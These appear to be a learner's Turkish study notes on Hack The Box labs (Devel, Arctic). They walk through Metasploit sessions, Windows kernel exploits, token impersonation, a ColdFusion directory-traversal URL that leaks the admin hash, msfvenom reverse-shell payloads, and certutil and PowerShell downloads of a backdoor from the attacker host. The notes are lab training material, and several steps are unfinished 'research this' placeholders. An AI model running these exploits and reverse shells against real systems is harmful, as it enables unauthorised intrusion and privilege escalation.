+put atil.aspx çalıştırıyoruz ardından dir çalıştırdığımızda atil.aspx in ftp serverına başarılı bir şekilde upload edildiğini görebiliyoruz 
+
+ardından kali firefox tarayıcımızda geliyoruz.
+
+adres çubuğuna devel-ip/atil.aspx adresine gidiyoruz ve arkaplanda zararlımız sunucuda çalıştırılmış oluyor.
+
+daha sonra msfconsole un çalıştığı terminale geldiğimizde session umuzun geldiğini görebiliyoruz.
+
+entera basıyoruz ardından sessions -l çalıştırdığımızda gelen session ları görebiliyoruz 
+
+sessions -1 çalıştırdığımızda devel makinemize giriş yapmış oluyoruz 
+
+ardından sysinfo çalıştırdığımızda hedef makine ile ilgili bazı bilgileri elde edebilriz.
+
+örneğin çıktıda Computer: DEVEL şeklinde..
+
+OS: Windows7 sürümü olduğunu görüyoruz.
+
+dir çalıştırdığımızda aldığımız ilk çıktıda 
+
+Listing: c\windıws\system32\inetsrv dizininde olduğumuzu görüyoruz (mevcut olduğumuz dizin)
+
+shell çalıştırırsak windows un kendi shell ine geçiş yapmış oluruz.
+
+whoami çalıştırdığımızda 
+
+appool\web isimli bir kullanıcı olduğumuzu görüyoruz 
+
+windows ta, linuxtaki gibi root olma işlemine Administrator veya System User olmaya çalışma işlemi denir.
+
+Devel e meterpreter ile bağlandığımız için ls veya dir yazdığımızda mevcut dizindeki dosya ve klasörleri listeleyebiliriz.
+
+shell çalıştırdıktan ve windows un powershell ine geçtikten sonra exit çalıştırarak tekrar meterpreter shell e dönebiliriz.
+
+shell > systeminfo çalıştırırsak linuxdaki sysinfo komutundan çok daha detaylı bir sistem bilgisi çıktısı alabiliriz.
+
+powershell deyken hostname komutu çalıştırırsak ne gibi bir bilginin çıktıısnı alırız araştır buraya yaz
+
+whoami /priv  çalıştırırsak mevcut kullanıcımızın windows sistemde hangi yetkilere sahip olduğunu hangi yetkilere sahip olmadığını gösteren bir tablo çıktısı alırız böylece mevcut kullanıcımız Administrator veya System User mı bunu anlamış oluruz. 
+
+Privilege Name sütununun altındaki 3. satırdaki SetShutDownPrivilege yetkisi bilgisayarı kapatma yetkisidir 
+
+bizde bu (State sütununun altındkai bilgide) Disabled -yani bu yetkiye sahip olmadığımızı görüyoruz-
+
+SeAuditPrivilege satırındaki yetki güvenlik denetimleri yapmaya yine yetkimizin olmadığını görüyoruz.
+
+SeTimeZonePrivilege satırı da saat dilimini değiştirmeye yetkimizin olup olmadığını bize söylüyor.
+
+whoami /groups çalıştırdığımızda sistemde var olan bütün grupların isimlerini görüyoruz.
+
+bu gruplardan NT AUTHORITY/SERVICE grubundaki kullanıcılar yetkili/admin olan kullanıcıların bulunduğu gruptur.
+
+NT AUTHORITY/Authenticated Users , kimliği doğrulanmış kullanıcı adı ve şifre kullanılarak giriş yapan kullanıcıların bulunduğu gruptur.
+
+net user komutunu çalıştırırsak aldığımız çıktıda Administrator       babis şeklinde admin olan kullanıcının kim olduğunu görebiliriz.
+
+net user babis çalıştırdığımızda babis ile ilgili detaylı bir çıktı alırız.
+
+çıktıda User name: babis şeklinde ilgili kullanıcının kullanıcı adını, Full Name (adı ve soyadını)
+
+Account active: Yes şeklinde ilgili kullanıcının hesabı anlık olarak sistemde aktif mi, Account expires: Never satırında ilgili kullanıcının kullanım, oturum süresi (mevcut bir oturum süresi var mı bu süre bitince ilgili oturumun kapanması gibi durumlarda)
+
+Password expires: Never (bu satırdaki bilgi ne anlama geliyor araştır buraya yaz)
+
+yine aynı şekilde net user Administrator çalıştırarak linuxdaki root kullanıcısı ile eşdeğer olan kullanıcının bilgilerini görüntüleyebiliriz.
+
+ipconfig çalıştırarak hedef makinanın bağlı olduğu ağdaki ip adreslerini görüntüleyebiliriz.
+
+arp -a çalıştırarak arp tablosunu görüntüleyebiliriz.
+
+(bu arp tablosuna veya ipconfig çalıştırmamızın sbebei makinayı hacklerken ağda başka bir cihaz var mı ve biz bu cihaz a erişmemiz gerekiyor mu gibi senaryoları kontrol edebiliriz.)
+
+route print çalıştırınca angi bilgileri çıktı olarak alıyoruz araştır buraya yaz.
+
+netstat -ano sistemde hangi portlard dinleme işleminin olduğunu görüntüleyebiliriz. (bu komut windows makinelerde kullanmamız gereken önemli bir komuttur)
+
+ardından cd .. çalıştırarak c:\Windows\system32 dizinine geliyoruz.
+
+daha sonra findstr /si password *.txt çalıştırarak içinde password stringi geçen * -yani bütün- .txt dosyalarının çıktısını alıyoruz (/si parametresi ne analma geliyor ne işe yarıyor araştır buraya yaz)
+
+yine aynı şekilde /system32 nin içerisindeyken findstr /si password *.ini çalıştırarak bu sefer .ini dosyaları içinde arama yapabiliriz.
+
+findstr /si password *.xml da xml dosyalarının içeriisnde arama yapabiliriz.
+
+sc query windefend çalıştırdığımızda aldığımız çıktıdaki 
+
+STATE: RUNNING satırındaki bilgi ile mevcut olarak windowfs defender ın sistemde çalıştığını öğrenebiliyoruz.
+
+sc query type= service çalıştırdığımızda sistemde mevcut olarak çalışan servislerin çıktısını alabiliriz.
+
+netsh firewall show state çalıştırırsak sistemde mevcut olan bütün firewall ların çıktısını ve bu firewall ların aktif olup olmadığı bilgisini çıktı olarak alabiliriz.
+
+bu komutla eşdeğer olarak netsh advfirewall komutunu da çalıştırabiliriz.
+
+bu dersimizde devel makinesinde kernel exploit bulmaya çalışalım.
+
+https://github.com/AonCyberLabs/Windows-Exploit-Suggester bağlantısındaki sağ üstte ki yeşil renkli Code butonuna basıp > Download ZIP diyerek  AonCyberLabs / Windows-Exploit-Suggester ı indiriyoruz.
+
+ardından /Downloads dizinine dosya gezgininden gidiyoruz ardından çift tıklayarak içerisindeki windows-exploit-suggester.py dosyasını sürükleyip /Downloads a bırakıyoruz.
+
+ardından kali terminalimizi açıp cd /Downloads çalıştırıyoruz. 
+
+ardından /windows-exploit-suggester.py --update çalıştırıyoruz.
+
+bu kodu çalıştırdıktan sonra mevcut bulunduğumuz dizinde .xls uzantılı bir dosya oluşturuluyor.
+
+ardından pip install xlrd --upgrade çalıştırıyoruz. (xlrd nedir ne işe yarar neden ub komutu çalıştırma ihtiyacı duyduk araştır buraya yaz)
+
+ardından devel e bağlı olduğumuz terminalde systeminfo çalıştırıp aldığımız çıktıyı 
+
+Microsoft Windows (Version 6.1 7600) satırından itibaren -bu satır dahil- 
+
+[01]: 10.10.10.5 satırı dahil -kadar- olan bilgileri kopyalıyoruz.
+
+ardından /Downloads dizininde olduğumuz terminale gelip nano windowsexploit.txt çalıştırıyoruz.
+
+ardından sağ tık Paste Clipboard diyerek yapıştırıyoruz. ardından ctrl+o ctrl+x yaparak çıkıyoruz.
+
+ardından /windows-exploit-suggester.py --database mevcut-xls-dosyasının-adı.xls --systeminfo win7sp1-windowsexploit.txt 
+
+çalıştırmadan önce windows-exploit-suggester.py dosyasını çalıştırdıktan sonra oluşan .xls dosyasının adını yukarıdaki kodda yazmamız gerekiyor buna dikkat et.
+
+(ve eğer oluşan dosya .xlsx ise koddaki --database 2014-06-06-mssb.xls kısmını --database 2014-06-06-mssb.xlsx şeklinde değiştir )
+
+çalıştırdıktan sonra aldığımız çıktıda başında [M] veya [E] olan ve (açık yeşil renkteki) bütün satırlar Devel için kullanabileceğimiz exploitleri ifade ediyor. 
+
+
+bu dersimizde devel i exploit etmeye devam edelim 
+
+msfconsole ile devel e bağlanıyoruz..
+
+meterpreter shell deyken getsystem çalıştırdığımızda eğer hedef makinede çok bariz çok kolay bir açık/açıklar (örneğin bu açıklar neler araştır buraya yaz) burada bu exploit edilecek ve root olacağız 
+
+ancak bu açıklar devel makinesinde bulunmadığı için exploit edemiyoruz.
+
+run post/multi/recon/local_exploit_suggester çalıştırdığımızda hedef sistemde, msfconsole un exploit veritabanında çalışacak exploitleri bize listeliyor suggestting ediyor yani -öneriyor-
+
+gelen çıktıda başında açık yeşil/turkuaz renkli [+] karakteri olan satırlar bize önerilen exploitlerdir.
+
+burada hbt dan kaynaklı olarak session ımız sonlanabilir tekrar bağlanmak için 
+
+exploit -j -z > kali firefoxdan 10.10.10.5/atil.aspx adresine gidiyoruz.
+
+ardından sessions -l > hangi session numarasıysa örneğin sessions 2 çalıştırarak bağlanıyoruz.
+
+https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation bağlantısından farklı farklı açıklar hakkında bilgi edinebilir ve bu açıkları exploit etmek için örnek payloadları bulabiliriz.
+
+https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases 
+
+bağlantısındaki 
+
+winPEASany.exe winPEASx64.exe ve winPEASx86.exe dosyalarını kali lokalimize indiriyoruz.
+
+indirirken mozilla bu dosyaların zararlı olabileceğini düşündüğü için indirilenler kısmından indirmeye izin verirsek sorunsuz bir şekilde indirebiliriz.
+
+meterpreter shell de pwd çalıştırdığımızda c:\windows\system32\inetsrv dizininde olduğumuzu görüyoruz.
+
+cd c:\\windows\\temp çalıştırdıktan sonra pwd çalıştırırsak c:\windows\temp çıktısını alırız.
+
+bu dizine gitmemizin sebebi github dan indirdiğimiz winpeas dosyalarını msfconsole ile bu dizine upload etmeye genelde yetkimiz olur bu yüzden bu dizini seçtik diğer dizinlerde yetki problemi yaşamayalım diye.
+
+ardından meterpreter shell deyken upload /root/Downloads/winPEASx86.exe çalıştırıyoruz.
+
+ardından winPEASx86.exe çalıştırdığımızda exe dosyamızın çalışmadığını görüyoruz; bu durum, winPEASx86.exe dosyasını çalıştırmamıza iznimiz olmadığı için olabilir.
+
+(bu dosyanın neden çalıştırılmadığını araştır sebebini buraya yaz)
+
+bu dersimizde devel de admin olmayı öğrenelim.
+
+meterpreter shell ile devel e bağlı olduğumuz terminalde
+
+use exploit/windows/local/ms_10_015_kitrap0d çalıştırıyoruz ardından show options > set session 2 (burada devel e hangi session numarasından bağlandıysak o sayıyı yazıyoruz.)
+
+(yukarıdaki satırda 015 yerine O15 de olabilir olmazsa O15 yapıp dene)
+
+ardından set lhost kali-lokal-ip daha sonra set lport 4444 (devel e bağlandığımız portu burada kullanmamalıyız çakışma olmasın diye)
+
+ardından exploit çalıştırdığımızda "exploit completed but no session was created" çıktısını alırsak htb dan dolayı devel ile olan bağlantımız kopmuş olabilir.
+
+o yüzden use exploit/multi/handler > exploit -j -z > show options (yaptıktan sonra az önceki ayarlamaları yapıyoruz)
+
+son olarak exploit çalıştırdıktan sonra sessions -l çalıştırıyoruz ve eğer 2 adet session çıktı olarak alıyorsak başarılı bir şekilde exploit ettik demektir.
+
+gelen çıktıda Information sütunundaki değer NT AUTHORITY / SYSTEM @DEVEL olan session u 
+
+-örneğin sessions 6 çalıştırarak- bağlanıyoruz.
+
+ardından getuid çalıştırdığımızda Server username: NT AUTHORITY / SYSTEM çıktısı alırsak root olduğumuz anlamına gelir.
+
+yine aynı şekilde shell > whoami çalıştırırsak NT AUTHORITY / SYSTEM çıktısını alırız.
+
+.. > .. > .. > dir > cd users çalıştırırsak sistemdeki mevcut kullanıcıları görebiliriz.
+
+cd Administrator çalıştırırsak admin in kullanıcı dizinine gideriz.
+
+cd Desktop > type root.txttxt çalıştırırsak root flagini alırız.
+
+bu dersimizde devel e potato saldırısı yapmayı öğrenelim.
+
+devel e meterpreter shell ile bağlandıktan sonra getuid çalıştırdığımızda ISS APPPOOL/web çıktısını alıyoruz / aldığımız durumda;
+
+windows da token dediğimiz bazı araçlar vardır, bu tokenler bir sisteme veya bazı durumlarda bir ağa herhangi bir kimlik bilgisi vermeden (kullanıcı adı ve parola) bağlanabilmemizi sağlıyor. bunu cookie gibi düşünebiliriz. 
+
+meterpreter shell de iken load incognito ardından list_token -u çalıştırırsak sistemde mevcut kullanıcıların tokenleri var mı bunun çıktısını alırız.
+
+shell > whoami /priv çalıştırdığımızda gelen çıktıda sondan 4. satırda Impersonate a client after authentication şeklinde bir izin türü olduğunu görüyoruz ve bu izin mevcut -yani ilk giriş yaptığımız ve çok az yetkiye sahip kullanıcımızın State sütununda Enabled olduğunu görüyoruz bütün izinler Enabled gözüküyorsa muhtemelen daha önce root olduğumuzdan dolayıdır
+
+(sistemde hangi yetkilere sahip olduğumuz ile ilgili komutu meterpreter shell de getprivs çalıştırarak da öğrenebiliriz)
+
+(windows shell de iken tekrar meterpreter shell e dönmek istersek hangi komutu çalıştırmalıyız araştır buraya yaz)
+
+(windows shell ile windows powershell arasındaki fark ne araştır buraya yaz)
+
+https://github.com/foxglovesec/Potato/blob/master/source/Potato/Potato/bin/Release/Potato.exe bağlantısındaki dosyayı sağ altta bulunan Download butonuna tıklayarak kali lokalimize indiriyoruz. firefox dosyayı malware olarak görebilir buna izin vererek indiriyoruz daha sonra indirdiğimiz Potato.exe yi sağ tık cut yapıp 
+
+/var/www/html dizinine yapıştırıyoruz. daha sonra başka bir terminal tabından service apache2 start çalıştırıyoruz.
+
+(service apache2 status komutunu çalıştırarak apache2 servisinin mevcut durumunu görüntüleyebiliriz)
+
+ardından devel meterpreter shell imize gelip 
+
+\temp dizinine gittikten sonra certutil -urlcache -f http://kali-lokal-ip/Potato.exe pot.exe çalıştırdığımızda aynı ağda başka bir bilgisayarın apache2 servisi ile paylaşıma açtığı dosyaları lokalimize indirebiliriz 
+
+(cd c:\windows\temp çalıştırarak direk ilgili diizne gidebiliyor muyuz windows shell de araştır buraya yaz)
+
+devel meterpreter shell de iken background çalıştırdığımızda oturumumuzu arkaplana alıp msfconsole a geçiş yapabiliriz daha sonra use exploit/windows/local/ms_16_075_reflection çalıştırıyoruz eğer 
+
+no payload configured, defaulting to windows/meterpreter/reverse_tcp çıktıısnı görürsek exploitin payloadı bizim için meterpreter tarafından otomatik olarak ayarlanmıştır ve ek bir konfigrasyon yapmamaıza gerek yok demektir eğer bu çıktıyı almasaydık set payload windows/meterpreter/reverse_tcp çalıştırmamız gerekirdi 
+
+ardından show options > set session 2 > set lhost kali-lokal-ip > set lport 4444 (4444 doluysa 4242 yaz) 
+
+ardından exploit çalıştırdığımızda bir takım işlemler gerçekleşiyor ardından load incognito çalıştırıyoruz 
+
+ardından list_tokens -u çalıştırdığımızda gelen çıktıda Impersonation Tokens Available başlığının altına 
+
+NT AUTHORITY\SYSTEM şeklinde bir tokenin geldiğini görüyoruz
+
+(daha önceki kısımlarda NT AUTHORITY\SYSTEM İ NORMAL SLASH İLE YAZDIĞIM YERLER VARSA ORALARI DÜZELT )
+
+ardından meterpreter shell de impersonate token "NT AUTHORITY\SYSTEM" çalıştırdığımızda artık NT AUTHORITY\SYSTEM yani Administrator kullaıcısını impersonate  -taklit / yetkilerini taklit etmek- edebiliyoruz 
+
+bunu getuid çalıştırdığımızda Server username: NT AUTHORITY\SYSTEM çıktısını alarak doğrulayabiliriz 
+
+yine aynı şekilde shell > whoami çalıştırırsak NT AUTHORITY\SYSTEM çıktısını alırız
+
+cd .. > cd .. > cd .. > cd Users > cd Administrator > cd Desktop > type root.txt.txt çalıştırarak flagi alabilirtiz (geçen sefer .. .. .. şeklinde ve Users ı küçük yazdıysam oraları düzelt)
+
+(shell > certutil -urlcache -f http://hedef-dosyanın-ipsi/dosya-ismi şeklinde windows da aynı ağdaki bir cihazın lokalindeki dosyayı indirebiliriz /sadece aynı ağdaki bir bilgisayar mı yoksa başka bir bilgisayardaki dosyayı da indirebilir miyiz araştır buraya yaz
+
+bu dosyayı indirilecek cihazda yani kendi cihazımızda \temp dizinine giderek yapalım ki yetki problemleri olmasın)
+
+bu dersimizde devel de manual olarak yetki yükseltmesi nasıl yapılır bunu öğrenelim.
+
+bu dersimizde MS10-059 isimli açığı manual olarak exploit edelim 
+
+(https://github.com/SecWiki bu repository de siber güvenlikle alakalı güzel içerikler bulabiliriz)
+
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059 bağlantısındaki MS10-059.exe dosyasını kali lokalimize indiriyoruz.
+
+Save file dedikten sonra firefox indirilenler kısmından bndirmeyi kabul ediyoruz / onaylıyoruz.
+
+ardından indirdiğimiz bu dosyayı cut yapıp /var/www/html dizinine yapıştırıyoruz.
+
+ardından bu dosyaya sağ tık > rename > ms10059.exe şeklinde ismini değiştiriyoruz.
+
+meterpreter shell de iken exit -y veya exit yapıyoruz (exit yazdığımızda hata verirse exit -y çalıştır)
+
+ardından msfconsole > use exploit/multi/handler > set payload windows/meterpreter/reverse_tcp > options > set lhost 10.10.14.19 (kali-lokal-ip) > set lport 4242 çalıştırıyoruz. ardından exploit -j -z çalıştırıyoruz 
+
+ardından firefox browserımızdan http://kali-ip/ms10059.exe adresine giderek exe yi çalıştırıyoruz.
+
+(peki bu exe yi kali de çalıştırdığımızda devel i hacklememizin sebebi nat network de olmamızdan dolayı mı ? burayı tam anlamadım araştır buraya yaz.)
+
+sessions -l > sessions 1 çalıştırıyoruz (ya da session numarası neyse onu..)
+
+shell > cd c:\\windows\\temp > certutil -urlcache -f http://kali-ip/ms10059.exe çalıştırarak kali lokalimizdeki ms10059.exe ms10.exe dosyasını devel lokaline indiriyoruz. (ms10.exe ismiyle kaydediyoruz sonda ms10.exe yazmamız bunu sağladı)
+
+ms10.exe 10.10.14.19 1234 ÇALIŞTIRALIM AMA ŞİMDİ DEĞİL (burada ilk sayısal kısım kali lokal ip miz ikinci 1234 kısmı da devel de alacağımız shell i dinediğimiz porrt numarası.)
+
+kali new tab de nc -nvlp 1234 çalıştırıyoruz ardından devel e bağlı olduğumuz terminale gelip 
+
+ms10.exe 10.10.14.19 1234 çalıştırıyoruz ve 10 saniye kadar bekledikten sonra nc (netcat) çalıştırdığımız terminale bir bağlantı geldiğini görüyoruz 
+
+enter tuşuna bastıktan sonra whoami çalıştırdığımızda nt authority/system çıktıısnı alıyoruz yani root olmayı başarıylla tamamladık.
+
+bu dersimizde htb daki Arcticle isimli makineyi çözelim 
+
+htb ın ağına bağlandıktan sonra Arcticle ın sayfasındaki Spawn MACHİNE BUTONUNA TIKLAYARAK MAKİNAMIZI BAŞLATIYORUZ.
+
+bu örneğimiz için arcticle ın ip si 10.10.10.11 olsun 
+
+ardından -kali de htb vpn im çalışıyorken- yeni bir terminal tabinde nmap -p- -T4 -A -v 10.10.10.11 
+
+çalıştırıyoruz (koddaki parametreler ne işe yarıyor araştır buraya yaz.)
+
+htb makine sayfalarında Statictis tabına gelirsek burada ilgili makinenin hangi konular hakkına ağırlık verdiğini buradan görebiliriz.
+
+çalıştırdıktan hemen kısa bir üsre sonra aldığımız çıktının son satırında discovered open port 135/tcp on 10.10.10.11 çıktısını alıyoruz bu, arctics makinesinin 135 numaralı portu açık anlamına gelir
+
+windows hedef makinalarda nmap taraması çok önemlidir çünkü linuxdan farklı olan servisler ilgili makinee olabilir.
+
+4-5 dakika kadar bekledikten sonra nmap -p- -T4 -A -v 10.10.10.11  komutunun çıktısı tamamlanıyor.
+
+(bu ve buna benzer uzun ve tarama sonucu içeren çıktıları ctf i çözme sürecinde bir not defterinde tutmak isteyebiliriz.)
+
+aldığımız çıktıda 
+
+PORT      STATE    SERVICE     VERSION
+
+135/tcp    open      msrpc    Microsoft windows RPC
+8500/tcp   open      fmtp?      
+49154/tcp  open      msrpc    microsoft windows RPC 
+
+satırının / tablosunun altındaki satırlarda hangi portların açık olduğunu görebiliriz.
+
+buradan gördüğümüz kadarıyla 2 portta RPC (Remote Procedure Call) = cihazlar arası uzaktan erişime izin veren bir client-server servisidir
+
+1 portta da uçaklar ile kule arasında iletişimi sağlamak için kullanılan FMTP (Flight Message Transfer Protocol) servisi çalışıyor.
+
+kali firefoxdan http://10.10.10.11:8500/ adresine gidiyoruz.
+
+ardından karşımıza; 
+
+Index of / 
+
+CFIDE/
+
+cfdocs/ şeklinde iki adet dizin çıkıyor bunların ikisini de sağ tık > yeni sekmede aç diyoruz.
+
+/cfdocs/images in içerisindeki CF_header_with_jelly_large.jpg dosyayı açtığımızda burada ColdFusion isminde bir ürünün kullanıldığını görüyoruz bu Adobe firmasının bir hizmeti/servisi/ürünü
+
+web uygulamaları geliştirmek içn oluşturulan bir platform / programlama dilidir.
+
+bu ürün özellikle devlet dairelerinde ve çok büyük firmalarda hala kullanılır.
+
+ardından kali firefoxdan http://10.10.10.11:8500/CFIDE/administrator/enter.cfm dosyasını çalıştırıyoruz 
+
+username : admin şeklinde otomatik olarak oluşturulmuş
+
+Password: ' 
+
+şeklinde sadece tek tırnak işareti vererek Login butonuna basıyoruz ve password kısmında uzunca gizlenmiş karakterlerin olduğunu görüyoruz bu parolanın encrypted edilip yollandığı anlamına geliyor.
+
+ve index of daki dosyaları açarken veya dizin içerisinde -tarayıcıda- dolaşırken açmak istediğimiz şeyi 10 sn gecikmeyle açması muhtemelen bruteforce saldırısı yapmamızı engellemek için koydukları bir önlem.
+
+yani her yanlış şifre denemesinde bir sonraki şifreyi 10 sn sonra denememiz gerwektiği için şifreyi bulmamız yıllar sürebilir.
+
+burada kullanılan ColdFusion8 sürümünün admin sayfasında bilinen bir açık var mı bunu bulmaya çalışalım çünkü brute force ile giremeyeceğiz belli ki.
+
+bu dersimizde cf un admin panelinden admin kullanıcısıyla giriş yapmaya çalışalım.
+
+new terminal tab ından searchsploit coldfusion çalıştırıyoruz.
+
+(searchsploit, metasploit vb veritabanlarındaki exploitleri aramamızı sağlayan bir araçtır.)
+
+Uzun bir çıktı aldık bu çıktıda bizim istediğimiz explıit hangisi Exploit Title kısmında yazan ilgili exploit in hangi coldfusion sürümünde geçerli olduğunu kontrol ederek bulabiliriz.
+
+biz çıktı olarak aldığımız exploitlerden 2. sıradaki olan Adobe ColdFusion - Directory Traversal açığını kullanalım;  
+
+ardından yeni açtığımız terminal tab inde cd /usr/share/exploitdb/exploits/multiple/remote çalıştırıyoruz 
+
+ardından cat 14641.py çalıştırıyoruz. (cat14641.py çalıştırdık çünkü aldığımız çıktıda ilgili exploit in Path sütununda, yani hangi dizinde bulunduğu bilgisini veren sütunda bu dizin yer alıyordu ancak buradaki dizin bazen yanlış olabilir bunun sebebini yaz ) [sebebini bilmiyorum ancak searchsploit kali linux da /user/share/exploitdb dizininde aratma yaptığı için muhtemelen buradadır diye ilgili dosyayı burada arıyoruz.
+
+dosyayı açtıktan sonra 2. http://10.10.10.11:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en VEYA
+
+http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en (buradaki server ifadesi arcticle ın ip adresini yaz anlamında mı yazılmış araştır buraya yaz)
+
+veya http://10.10.10.11/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en (burada da hangi portan bağlanacağımızı seçmeden direk bağlantıya gidiyoruz bunu da dene çalışıyorsa buraya yaz)
+
+bunu bağlantıyı firefox da açıyoruz. 10 saniye sonra admin paneli açıldığında CF logosunun altındaki 
+
+password:2F.....03 şeklindeki şifreyi kopyalıyoruz hemen altındaki encrypted=true ifadesine göre şifre hashli bir şekilde bize verilmiş bu hash i çözüp plain text parolayı bulalım.
+
+öncelikle bu hash in hangi algoritma ile hashlendiğini bulmaya çalışalım.
+
+hash-identifier çalıştırıyoruz (bu araç ona verdiğimiz hash in hangi algoritma ile hashlendiğini bize söylüyor) ardından 2F.....03 yazıp entera basıyoruz (yani kopyaladığımız hash i tool a veriyoruz.)
+
+ardından gelen çıktılarda Possible Hashes: -yani olası hash algoritmaları diye bize bir liste veriyor burada çoğu satırda SHA-1 olabileceğini söylüyor bize tool.
+
+ardından google dan sha1 decrypt online şeklinde bir arama yapıyoruz.
+
+https://hashes.com/en/decrypt/hash bağlantısından 
+
+Enter your hashes here and we will attempt to decrypt them for free online.
+
+kısmının altındaki inputa hashimizi veriyoruz ve hemen aşağıdaki mavi renkli SUBMIT & SEARCH butonuna basıyoruz.
+
+ardından sayfada yeşil renkli bir alan içerisinde 
+
+Found: 
+
+hashimiz:happyday şeklinde bir çıktı aldık; yani parolamız happyday miş ardından 
+
+http://10.10.10.11:8500/CFIDE/administrator/enter.cfm adresine gidip bulduğumuz bu parolayı submit ederek admin olarak giriş yapabiliriz.
+
+10 sn gecikme olduğu için parolayı submit ettikten sonra biraz beklenemiz gerekiyor.
+
+
+bu dersimizde coldfusion un admin panelinde bazı işlemler gerçekleştirelim.
+
+admin panelinin sol tarafındkai DEBUGGING & LOGGING başlığının altında Scheduled Tasks şeklinde bir kısım var bunu cronjob gibi düşünebiliriz. (programlanmış / planlanmış görevler)
+
+buraya tıkladığımızda karşımıza Schedule New Task şeklinde gri renkli bir buton çıkıyor buna tıklıyoruz.
+
+ardından açılan sayfada aşağıda File: şeklinde bir satır var bu satırda URL: satırında indirilen dosyayı Arctic makinasının sisteminde hangi path e upload edeceğini yazmamız gereken kısım peki biz absolute path i nereden bileceğiz ? 
+
+bunun cevabı da sol taraftaki SERVICE % SETTINGS başlığının altında Mappings (Site haritası) kısmına tıkladığımızda en aşağı kısımda Active ColdFusion Mappings kısmının altında 
+
+Logical Path sütununun altında /CFIDE yazan satırın Directory Path sütunundaki değeri yani 
+
+C:\ColdFusion8\wwwrootCFIDE dizinidir yani File: satırına bu dizini yazıyoruz.
+
+URL: satırındaki değere hangi url deki dosyayı indireceğimizi yazmamız gerekiyor
+
+new tab terminalden msfvenom -p java/jsp_shell_reverse_tcp LHOST=KALİ-İP LPORT=4444 -f raw > /var/www/html/shell.jsp çalıştırıyoruz (burada neden -f raw yaptık araştır buraya yaz)
+
+ardından service apache2 start çalıştırıyoruz 
+
+ardından coldfusion admin paneline geliyoruz 
+
+Task Name: Test 
+
+Frequency: One Time at 10:09
+
+URL:kali-ip/shell.jsp
+
+File:C:\ColdFusion8\wwwrootCFIDE\shell.jsp (sonunda indirilen dosyayı hangi adla kaydedeceğimizi söylüyoruz)
+
+Publish: Save output to a file ı işaretliyoruz
+
+ardından sol alttaki Submit butonuna basıyoruz.
+
+daha sonra Submit ettikten sonra açılan Scheduled Tasks sayfasında sol alttaki Actions sütununun en başındaki yeşil renkli yuvarlağa tıklayarak task ımızı çalıştırıyoruz.
+
+10 saniye sonra task ımızın çalıştırıldığına dair sayfanın en üstünde yeşil renkte .... completed successfully bildirimini alıyoruz.
+
+ardından browserdan http://arcticle-ip/shell.jsp adresine gidiyoruz.
+
+ardından kali terminalimizde yeni açtığımız tabda msfconsole > show payloads > set payload java/jsp_shell_reverse_tcp > show options > set lhost kali-ip > lport u değiştirmeye gerek yok bunu çalıştırdıktan sonra exploit -j -z çalıştırıyoruz
+
+daha sonra msfconsole un çalıştığı tab a gittiğimizde shell imizin geldiğini görebiliyoruz 
+
+sessions -l > sessions 1 > ardından biraz bekledikten sonra entera bastığımızda başarılı bir şekilde windows shell e geçtiğimizi görebiliriz.
+
+whoami çalıştırdığımızda arctic/tolis çıktısını alıyoruz 
+
+systeminfo çalıştırırsak sistem ile ilgili genel bilgileri alabiliriz.
+
+bu dersimizde Schelevator konusunu öğrenelim 
+
+biz en normal bir şekilde windows shell alarak sisteme girmiştik şimdi bir trick ile sistemde meterpreter shell i nasıl alabiliriz bunu öğrenelim.
+
+bunun için yeni bir back door oluşturalım.
+
+new terminal tab > msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali-ip LPORT=1234 -f exe > /var/www/html/mybackdoor.exe
+
+şimdi bu oluşturduğumuz backdoor u arcticle dan indirelim bunun için certutil veya powershell kullanabiliriz ancak certutil her zaman düzgün bir şekilde çalışmayabilir bu yüzden bu uygulamada powershell kullanarak yapmaya çalışalım.
+
+arctic a bağlandığımız terminalde C:\ColdFusion8\runtime\bin dizininde iken 
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://kali-ip/mybackdoor.exe','mybackdoor.exe')"
+
+(bu komutta, windowsta WebClient isminde bir modül var; bu modülün içerisnde Downloadfile isminde bir metod var bir bu metodu indirmek istediğimiz dosyanın urlsini ve dosyayı lokalimize indirirken nasıl kaydedeceğimizi yazarak çağırıyor ve çalıştırıyoruz)
+
+(eğer mwvcut kullanıcımızın powershel ile bir işlem yapmaya yetkisi yoksa certutil kullanarak ilgili dosyayı indirmeyi deneyebilriz.)
+
+(bu sırada session u kaybettiysek bağlanıp bu işlemleri en baştan yapmamız gerekiyor)
+
+ardından işlem bitip shell geldiğinde dir çalıştırdığımızda mevcut dizine mybackdoor.exe yi indirdiğini görebiliyoruz.
+
+ardından yeni açtığımız terminal tabında msfconsole > use exploit/multi/handler > set payload windows/meterpreter/reverse_tcp > show options > set lhost kali-ip > set lport 1234 > exploit -j -z çalıştırarak bu işlemi arkaplana atıyoruz.
+
+ardından arcticle a gelip mybackdoor.exe çalıştırıyoruz ardından msfconsole a geldiğimizde session umuzun geldiğini görüyoruz. sessions -l > sessions 1 > getuid çalıştırdığımızda ARCTIC/tolis çıktısını alıyoruz yani sistemde meterpreter shell imizi başarıyla aldık.
+
+ardından sysinfo çalıştırıyoruz.
+
+meterpreter shell i aldığımıza göre işimiz şuan daha kolay bunun sebebi de msfconsole da hazır olarak pek çok işlemi yapabileceğimiz içindir.
+
+şimdi exploit suggester ı çalıştırabiliriz örneğin.
+
+bunu yapmak için run /post/multi/recon/local_exploit_suggester çalıştırıyoruz
+
+ardından bize sistemde kullanabileceğimiz bazı exploitleri listeliyor.
+
+ardından session u background çalıştırarak arkaplana alıyoruz. (background ile exploit -j -z nin arasındaki fark ne araştır buraya yaz)
+
+ardından use exploit/windows/local/ms10_092_schelevator çalıştırıyoruz. 
+
+ardından show options > set session 1 (hangi sesssion numarasıysa onu yaz) > set lhost kali-ip > set lport 5555 > exploit çalıştırdığımızda 
+
+bize kullandığımız meterpreter shell imizin x86 mimaride yani 32 bit olduğunu hedef sistem arcticle 64 bit olduğu için meterpreter shell imizi 64 bit e geçirmemizi / değiştirmemizi istiyor.
+
+ardından sessions -l > sessions 1 > getuid çalıştırdığımızda 
+
+gelen çıktıda 
+
